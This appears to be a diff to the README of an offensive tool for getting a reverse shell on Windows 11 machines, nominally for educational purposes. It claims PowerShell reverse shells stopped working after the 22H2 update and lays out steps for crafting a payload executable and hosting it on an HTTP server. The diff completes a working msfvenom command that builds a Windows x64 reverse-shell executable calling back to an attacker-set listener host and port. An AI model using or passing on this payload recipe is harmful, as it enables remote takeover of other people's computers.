@@ -7,18 +7,18 @@ educational purposes and to create awareness.
 
 Since Microsoft pushed the latest 22H2 up-date for Windows 11 all Powershell reverse shell payloads have stopped working. Microsoft made changes to the way commandline tools are being opened. Everything will be opened in the new "Windows Terminal" and the "powershell -nop -noni -W hidden" commands are not working anymore.
 
-This Reverse Shell script is tested on the latest Windows version and is working properly. 
+This Reverse Shell script is tested on the latest Windows version and is working properly.
 
 Requirements:
 
-- HTTP server to host the shell executable - Step 2
 - The executable itself - Step 1
+- HTTP server to host the shell executable - Step 2
 
 ## 1 - craft malicious executable
 
 I'm using a Staged Meterpreter TCP reverse shell executable. To craft one you can use "msfvenom" with the following command:
 
-`msfvenom -p windows/x64/shell_reverse_tcp LHOST=`
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-LISTENER] LPORT=[PORT-LISTENER] -f exe > payload.exe`
 
 Change the LHOST and LPORT to your own listener server.
 
